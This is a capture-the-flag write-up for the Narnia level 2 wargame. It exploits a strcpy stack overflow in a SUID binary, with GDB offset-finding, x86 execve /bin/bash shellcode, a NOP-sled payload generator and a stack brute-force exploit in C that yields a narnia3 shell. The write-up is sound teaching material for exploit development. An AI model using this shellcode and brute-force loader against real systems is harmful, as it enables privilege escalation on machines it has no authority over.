# Overview
After gaining SSH access to the user `narnia2`, we can read and execute the files related to the new challenge in `/narnia/narnia2`.
By simply running the program we get this output:
```bash
narnia2@narnia:/narnia$ ./narnia2
Usage: ./narnia2 argument
narnia2@narnia:/narnia$
``` 
We can give it a random argument to see what happens:
```bash
narnia2@narnia:/narnia$ ./narnia2 thisisnarnia
thisisnarnianarnia2@narnia:/narnia$
```
So it is just printing out our argument as a string. We'll look at the source code for a better analysis.

# Code Analysis
## Source Code
Below is the source code found in `/narnia/narnia2.c`:
```C
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
    char buf[128];

    if(argc == 1){
        printf("Usage: %s argument\n", argv[0]);
        exit(1);
    }
    strcpy(buf,argv[1]);
    printf("%s", buf);

    return 0;
}
```
The first line inside `main` is `char buf[128]` declaring a char buffer of 128 bytes size.<br>
In the `if` block it is just checking if the user has typed some argument, and printing the "Usage" message.<br>
The last part of the code is copying the contents of the first argument (`argv[0]` is always the program's name/path) inside `buf`: `strcpy(buf,argv[1])`, and then sending it to the output: `printf("%s", buf)`.
## Security Flaws
We have a common and easy-to-solve security flaw here. First we have to remember that at this point all the challenges we've seen in Narnia have the SUID set, so each program runs as the right superior user - in this case, as narnia3.
So if we run a shell inside this program, we have it as narnia3 too. Second, the source code shows that the program is just copying the contents of the first argument inside `buf` without checking or correcting its size. So if our argument is more than 128 bytes long, the program will have a **buffer overflow** and strange things will happen.
So let's now use **GDB** to see what kind of "strange" behaviour the program can have.
## Debugging
After starting GDB with `gdb narnia2`, I'll use `set disassembly-flavor intel` for a more human-readable assembly display.<br>
We can now use `python3` for an easy test of the buffer-overflow's consequences at runtime. First, let's check what happens with an exact 128 byte long input (128 A's): 
```GDB
(gdb) r $(python3 -c "print('A'*128)")
Starting program: /narnia/narnia2 $(python3 -c "print('A'*128)")
Download failed: Permission denied.  Continuing without separate debug info for system-supplied DSO at 0xf7fc7000.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[Inferior 1 (process 26) exited normally]
```
Nothing interesting happened. Let's try a 140 byte long argument:
```GDB
(gdb) r $(python3 -c "print('A'*140)")
Starting program: /narnia/narnia2 $(python3 -c "print('A'*140)")
Download failed: Permission denied.  Continuing without separate debug info for system-supplied DSO at 0xf7fc7000.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```
Now we have something. Look at this "Segmentation Fault" message, it is telling us that our argument has made the program try to access a non-authorized memory region. And the next line is confirming it, saying that the program tried to execute a function at `0x41414141`.<br>
Remember that 41 is the ASCII code for "A", so this means that four bytes of our argument - four A's, since each `char` is 1 byte long - are overwriting the four bytes of EIP (instruction pointer) and then executing whatever is in this address.<br>
We have to know at what point our argument starts to write over EIP, so let's try a few size hints.
```GDB
(gdb) r $(python3 -c "print('A'*130)")
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[Inferior 1 (process 25) exited normally]

(gdb) r $(python3 -c "print('A'*135)")

Program received signal SIGSEGV, Segmentation fault.
0x00414141 in ?? ()

(gdb) r $(python3 -c "print('A'*136)")
Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```
With exactly 136 bytes, the argument starts a **buffer overflow** that completely overwrites EIP. The bytes after the 132nd are the four ones that go inside EIP. If we change them to B, we can confirm this thesis:
```GDB
(gdb) r $(python3 -c "print('A'*132+'B'*4)")

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```
And voilà, our EIP is now pointing to 0X42424242, in other words, "BBBB"! We can now intentionally choose which address the program will execute.

Now that we have control over EIP we can use `buf` as an "entry-door" for a shellcode (as we did with env-variables in the last challenge) at the program's memory. Once that has been done, we should then discover the start address of our shellcode and send it to EIP, so we could have a shell as narnia3.
## Discovering the Buffer Address
We could have a problem determining the exact address of `buf` if the `Narnia` machine has [ASLR](https://pt.wikipedia.org/wiki/Address_space_layout_randomization) enabled. In simple words, ASLR is an OS technique that randomizes the *base stack pointer* of the program at each runtime. To check if our target machine has ASLR enabled, we'll do:
```
narnia2@narnia:/narnia$ cat /proc/sys/kernel/randomize_va_space
0
```
Any value except zero means "ASLR enabled", so we're lucky. Now we know that every address (virtual address) used by the program will be repeated each runtime.<br>
Let's get back to GDB and look at the assembly code of our program:
```GDB
(gdb) disassemble main
Dump of assembler code for function main:
   0x08049186 <+0>:	    push   ebp
   0x08049187 <+1>:	    mov    ebp,esp
   0x08049189 <+3>:	    add    esp,0xffffff80
   0x0804918c <+6>:	    cmp    DWORD PTR [ebp+0x8],0x1
   0x08049190 <+10>:	jne    0x80491ac <main+38>
   0x08049192 <+12>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08049195 <+15>:	mov    eax,DWORD PTR [eax]
   0x08049197 <+17>:	push   eax
   0x08049198 <+18>:	push   0x804a008
   0x0804919d <+23>:	call   0x8049040 <printf@plt>
   0x080491a2 <+28>:	add    esp,0x8
   0x080491a5 <+31>:	push   0x1
   0x080491a7 <+33>:	call   0x8049060 <exit@plt>
   0x080491ac <+38>:	mov    eax,DWORD PTR [ebp+0xc]
   0x080491af <+41>:	add    eax,0x4
   0x080491b2 <+44>:	mov    eax,DWORD PTR [eax]
   0x080491b4 <+46>:	push   eax
   0x080491b5 <+47>:	lea    eax,[ebp-0x80]
   0x080491b8 <+50>:	push   eax
   0x080491b9 <+51>:	call   0x8049050 <strcpy@plt>
   0x080491be <+56>:	add    esp,0x8
   0x080491c1 <+59>:	lea    eax,[ebp-0x80]
   0x080491c4 <+62>:	push   eax
   0x080491c5 <+63>:	push   0x804a01c
   0x080491ca <+68>:	call   0x8049040 <printf@plt>
   0x080491cf <+73>:	add    esp,0x8
   0x080491d2 <+76>:	mov    eax,0x0
   0x080491d7 <+81>:	leave
   0x080491d8 <+82>:	ret
End of assembler dump.
```
Pay attention to this specific line: `0x080491b5 <+47>:	lea    eax,[ebp-0x80]`. There, the program is loading the base address of an area of 128 bytes (0x80 in hexadecimal) inside ***EAX***, so it is probably the instruction that allocated memory for `buf`. Let's put a `break` one instruction later:
```GDB
(gdb) break *0x080491b8
Breakpoint 1 at 0x80491b8
```
Now let's run the program and see the address inside ***EAX***:
```
(gdb) break *0x080491b8
Breakpoint 1 at 0x80491b8

(gdb) r $(python3 -c "print('A'*132+'B'*4)")
Breakpoint 1, 0x080491b8 in main ()

(gdb) p/x $eax
$5 = 0xffffd278
```
And simply like that we got the start address of `buf`: *0xffffd278*.
We could've done it in an easier way by using `ltrace`: a debug utility that shows us all the syscalls a program have done in runtime. We can use it by doing:
```
narnia2@narnia:/narnia$ ltrace ./narnia2 hello
__libc_start_main(0x804909d, 2, 0xfffd6084, 0 <unfinished ...>
strcpy(0xffffd278, "hello")                                                                 = 0xffffd278
printf("%s", "hello")                                                                       = 5
hello+++ exited (status 0) +++
```
If you have some pratice with C you know that the first argument of `strcpy` is a pointer to a `char` buffer, and this is exactly what we have in `strcpy(0xffffd278, "hello") `: the `buf` address.
# Exploitation
## Injecting Shellcode

I'll be using this simple x86 [shellcode](https://shell-storm.org/shellcode/files/shellcode-606.html) of 33 bytes. <br>
Even though we have discovered the address of `buf` and the OS doesn't have ASLR enabled, it's risky to put the exact start address into **EIP** because the smallest stack change could ruin our attack. So instead, we'll use a technique called *NOP sled*, that fills most of `buf`'s memory with [NOP instructions](https://en.wikipedia.org/wiki/NOP_(code)) that simply "do nothing" and pass EIP to the next instruction, leading the CPU to our shellcode start. So we can securely point **EIP** anywhere inside the *NOP sled* - like 0xffffd2aa which is 50 bytes inside -and still execute our shellcode. Doing that, we ensure that little changes in the *stack* will not break our payload. 
Now let's do some basic math: we have 132 bytes to use before entering *EIP*, the last 33 bytes should belong to our shellcode, so the initial 99 bytes will store our NOP sled.
That is the order: *NOP sled* -> *shellcode* -> *EIP overwriting* 
I've created (inside my temp dir) this little program in C whose only purpose is to print all we discussed:
```C
#include <stdio.h>
#include <string.h>

int main(){
    int sc_size = 33; //our shellcode size
    int ns_size = 132 - 33; // NOP sled size

    char shellcode[33] = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"; // our shellcode
    char nop_sled[ns_size];
    memset(nop_sled, 0x90, ns_size); // Filling nop_sled with 0x90, which is the hex encoding of the NOP instruction
    char sc_addr[4] = "\xaa\xd2\xff\xff"; //0xffffd2aa = 0xffffd278 + 50 (0x32) bytes, but in little-endian

    fwrite(nop_sled, 1, ns_size, stdout); // Using fwrite instead of printf, because printf stops "printing" once it finds any null-byte in memory
    fwrite(shellcode, 1, sc_size, stdout);
    fwrite(sc_addr, 1, 4, stdout);
    // NOP sled -> shellcode -> NOP sled address over EIP
    return 0;
}
```
Once compiled with `gcc exploit.c -o exploit`, we can run it:
```bash
narnia2@narnia:/narnia$ ./narnia2 $(/tmp/my_dir/exploit)

$ whoami
narnia3
```
## A False Positive
And we got it! A shell spawned, but I need to tell you the truth: it worked by luck! While debugging, GDB adds and removes a lot of information on the stack (mainly environment variables) that makes it become bigger (or smaller in some cases), consequently all the static addresses of variables and data are moved to some other place in memory. Because of that, almost all addresses in normal runtime are different from those seen inside GDB. With a little bit of luck in GDB, we can get addresses at least *next* to the right ones used in normal runtime. If we weren't lucky - in other words, 99% of the tries, our output running the exploit would be:
```bash
narnia2@narnia:/narnia$ ./narnia2 $(/tmp/my_dir/exploit)
Segmentation Fault (core dumped)
```
indicating that we tried to access a non-allowed region of memory. But how could we avoid the need for pure luck and ensure that EIP would get into our NOP sled?
## The Brute-Force Solution
### Why Brute-Force?
It's a simple fact that once we've printed our payload into `buf`, it is somewhere in the stack, we just don't know exactly where. But if we could try to point EIP to **every single** address inside the stack? We can say with complete certainty that one of these tries will eventually get an address inside the NOP sled, leading the CPU to execute our shellcode. Well, that's the main idea of a ***stack guessing attack***: brute-force all the stack (and a little beyond) to ensure we get the right address. 

### Another Exploitation Try
First, we need to know which addresses the stack both starts and ends. To do that, we can use gdb:
```GDB
narnia2@narnia:/narnia$ gdb narnia2
(gdb) break main
Breakpoint 1 at 0x8049189

(gdb) r $(python3 -c "print('A'*136)")
...

(gdb) info proc mappings
process 9546
Mapped address spaces:

Start Addr End Addr   Size       Offset     Perms File
0x08048000 0x08049000 0x1000     0x0        r--p  /narnia/narnia2
0x08049000 0x0804a000 0x1000     0x1000     r-xp  /narnia/narnia2
0x0804a000 0x0804b000 0x1000     0x2000     r--p  /narnia/narnia2
0x0804b000 0x0804c000 0x1000     0x2000     rw-p  /narnia/narnia2
0xf7d6a000 0xf7d89000 0x1f000    0x0        r--p  /usr/lib32/libc.so.6
0xf7d89000 0xf7f1b000 0x192000   0x1f000    r-xp  /usr/lib32/libc.so.6
0xf7f1b000 0xf7f94000 0x79000    0x1b1000   r--p  /usr/lib32/libc.so.6
0xf7f94000 0xf7f96000 0x2000     0x229000   r--p  /usr/lib32/libc.so.6
0xf7f96000 0xf7f97000 0x1000     0x22b000   rw-p  /usr/lib32/libc.so.6
0xf7f97000 0xf7f9c000 0x5000     0x0        rw-p
0xf7fbb000 0xf7fbd000 0x2000     0x0        rw-p
0xf7fbd000 0xf7fc1000 0x4000     0x0        r--p  [vvar]
0xf7fc1000 0xf7fc3000 0x2000     0x0        r--p  [vvar_vclock]
0xf7fc3000 0xf7fc6000 0x3000     0x0        r-xp  [vdso]
0xf7fc6000 0xf7fc7000 0x1000     0x0        r--p  /usr/lib32/ld-linux.so.2
0xf7fc7000 0xf7fec000 0x25000    0x1000     r-xp  /usr/lib32/ld-linux.so.2
0xf7fec000 0xf7ffb000 0xf000     0x26000    r--p  /usr/lib32/ld-linux.so.2
0xf7ffb000 0xf7ffd000 0x2000     0x34000    r--p  /usr/lib32/ld-linux.so.2
0xf7ffd000 0xf7ffe000 0x1000     0x36000    rw-p  /usr/lib32/ld-linux.so.2
0xfffdd000 0xffffe000 0x21000    0x0        rwxp  [stack] <-------- here is what we want
```
At the last line we can see the start and the end addresses of the stack, which are respectively: 0xfffdd000 and 0xffffe000. Now, we need to build an exploit that is capable of running `narnia2` many times as needed to cover the entire *stack* range, starting a new instance of `narnia2` at every address try.

I've done a small [exploit](https://github.com/Atreus75/CTF-Writeups/blob/main/Narnia/PoCs/narnia2_bruteforce_solution.c) to help, let's take a look:
```C
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <stdio.h>

int main(){
  // Setting up variables
	int sc_size = 33, ns_size = 99, p_size = 136;
    unsigned int addr = 0xfffdd000; // stack initial address
    unsigned int end = 0xffffe000; // stack final address
    unsigned int cur; // stack current address
    unsigned char shellcode[33] = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"; //execve /bin/bash
	unsigned char nop_sled[ns_size]; // NOP sled
	unsigned char payload[p_size]; // Full payload
// Using memcpy instead of strcpy to ignore null-bytes and keep copying data
	memset(nop_sled, '\x90', ns_size);
	memcpy(payload, nop_sled, ns_size); // Putting the NOP sled into the payload
	memcpy(payload+ns_size, shellcode, sc_size); // Putting the shellcode into the payload

    // Passing through all the stack possible addresses
    for (;addr < end; addr+=40) { // step of 40 bytes to speed up the attack
        memcpy(payload+ns_size+sc_size, &addr, 4);

        // Forking the process to execute narnia2 with a new address attempt
		char * const args[3] = {"./narnia2", payload, NULL};
	   	pid_t pid = fork();
		if (pid == 0){ // pid == 0 means the current process is actually a subprocess
			execve("./narnia2", args, NULL);
			_exit(1);
		}else{// If the current process is not a subprocess
			int status; 
			wait(&status); // waits for its "son" to end
            // printing the status so we can visually ensure the subprocess has terminated by segfault
			if (WIFSIGNALED(status)) {
    			printf("Signal: %d\n", WTERMSIG(status));
			}
		}

        //checking if the stack has already been completely covered
		memcpy(&cur, &addr, 4);
		if (cur == end) break;
    }
    return 0;
}
```
Compile it and store inside your own "tmp dir". Now, instead of luck all we need to have is patience to wait for a very long runtime. In my case, this was the output:
```
narnia2@narnia:/narnia$ ./narnia2 $(/tmp/my_dir/exploit_bruteforce)
Signal: 11
Signal: 11
Signal: 11
...
Signal: 11
$ whoami
narnia3
```
There it is. You can run this exploit 1 year later or more, if you use the right stack range, it will certainly work.
# Conclusion
This challenge is quite difficult for any beginner, but with some patience and curiosity, there are many lessons and concepts to learn before stepping into the next level like:

* GDB inner workings;
* stack debugging;
* exploit development;
* CPU registers;
* assembly analysis<br>

and so on. Certainly there are other solutions to learn about, but I've chosen just the two essential ones I've learned when I first tried this CTF as a beginner.<br>
See you in the next level.
